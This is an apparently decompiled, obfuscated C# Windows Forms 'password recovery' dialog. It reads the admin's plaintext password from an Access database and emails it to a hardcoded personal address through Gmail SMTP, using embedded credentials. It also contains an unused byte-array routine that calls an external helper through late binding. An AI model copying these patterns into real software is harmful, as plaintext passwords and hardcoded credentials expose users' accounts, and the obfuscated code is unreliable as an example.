using System;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Data.OleDb;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using w2L;

namespace x8N;

[DesignerGenerated]
public class Hd3 : Form
{
	private IContainer components;

	private Button _Button1;

	private Label _Label2;

	private Timer _Timer1;

	public Hd3()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Mw2));
		((Form)this).add_Load((EventHandler)To1);
		Cc7();
	}

	protected override void Tg6(bool Tz8)
	{
		if (Tz8 && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(Tz8);
	}

	private void Cc7()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Hd3));
		k2F(new Button());
		Wk2(new Label());
		Sy0(new Timer(components));
		((Control)this).SuspendLayout();
		((Control)Jk7()).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Jk7()).set_Location(new Point(52, 79));
		((Control)Jk7()).set_Name("Button1");
		((Control)Jk7()).set_Size(new Size(115, 31));
		((Control)Jk7()).set_TabIndex(1);
		((ButtonBase)Jk7()).set_Text("Send");
		((ButtonBase)Jk7()).set_UseVisualStyleBackColor(true);
		Lf8().set_AutoSize(true);
		((Control)Lf8()).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Lf8()).set_Location(new Point(58, 37));
		((Control)Lf8()).set_Name("Label2");
		((Control)Lf8()).set_Size(new Size(98, 15));
		((Control)Lf8()).set_TabIndex(12);
		Lf8().set_Text("(Only For Admin)");
		((Form)this).set_AcceptButton((IButtonControl)(object)Jk7());
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ButtonHighlight);
		((Form)this).set_ClientSize(new Size(217, 149));
		((Control)this).get_Controls().Add((Control)(object)Lf8());
		((Control)this).get_Controls().Add((Control)(object)Jk7());
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("frmPasswordRecovery");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Recovery Password");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Button Jk7()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void k2F(Button Mc4)
	{
		EventHandler eventHandler = Ej2;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = Mc4;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Label Lf8()
	{
		return _Label2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wk2(Label Kq0)
	{
		_Label2 = Kq0;
	}

	[SpecialName]
	internal virtual Timer r9Q()
	{
		return _Timer1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Sy0(Timer y2Y)
	{
		EventHandler eventHandler = r5H;
		Timer timer = _Timer1;
		if (timer != null)
		{
			timer.remove_Tick(eventHandler);
		}
		_Timer1 = y2Y;
		timer = _Timer1;
		if (timer != null)
		{
			timer.add_Tick(eventHandler);
		}
	}

	private void Ej2(object sender, EventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_0162: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			((Control)this).set_Cursor(Cursors.get_WaitCursor());
			r9Q().set_Enabled(true);
			DataSet dataSet = new DataSet();
			OleDbConnection val = new OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=|DataDirectory|\\LMS_DB.accdb;Persist Security Info=False;");
			val.Open();
			OleDbCommand val2 = new OleDbCommand("SELECT user_password FROM Registration,Users where Users.username=Registration.username and Registration.username = 'admin'", val);
			OleDbDataAdapter val3 = new OleDbDataAdapter(val2);
			((DbDataAdapter)(object)val3).Fill(dataSet);
			val.Close();
			if (dataSet.Tables[0].Rows.Count > 0)
			{
				MailMessage mailMessage = new MailMessage();
				mailMessage.From = new MailAddress("abcd@gmail.com");
				mailMessage.To.Add("Virendra_take@yahoo.co.in");
				mailMessage.Subject = "Your Password Details";
				mailMessage.Body = ("Your Password: " + Convert.ToString(RuntimeHelpers.GetObjectValue(dataSet.Tables[0].Rows[0]["user_Password"]))) ?? "";
				mailMessage.IsBodyHtml = true;
				SmtpClient smtpClient = new SmtpClient();
				smtpClient.Host = "smtp.gmail.com";
				smtpClient.Port = 587;
				smtpClient.Credentials = new NetworkCredential("abcd@gmail.com", "12345");
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				MessageBox.Show("Password Successfully sent \r\nPlease check your mail", "Thank you", (MessageBoxButtons)0, (MessageBoxIcon)64);
				((Control)this).Hide();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	internal static object[] Mt9(object Ez1, int Xa0)
	{
		byte[] array = new byte[16];
		int num = 0;
		checked
		{
			do
			{
				if (num == 0)
				{
					array[num] = 0;
				}
				else
				{
					array[num] = (byte)((num < 3) ? (Xa0 * num) : 255);
				}
				num++;
			}
			while (num <= 15);
			NewLateBinding.LateIndexSet(Ez1, new object[2]
			{
				0,
				w6A.Sc0((byte[])NewLateBinding.LateIndexGet(Ez1, new object[1] { 0 }, (string[])null), array, 255)
			}, (string[])null);
			return (object[])Ez1;
		}
	}

	private void r5H(object sender, EventArgs e)
	{
		((Control)this).set_Cursor(Cursors.get_Default());
		r9Q().set_Enabled(false);
	}

	private void Mw2(object sender, FormClosingEventArgs e)
	{
		((Control)this).Hide();
	}

	private void To1(object sender, EventArgs e)
	{
	}
}
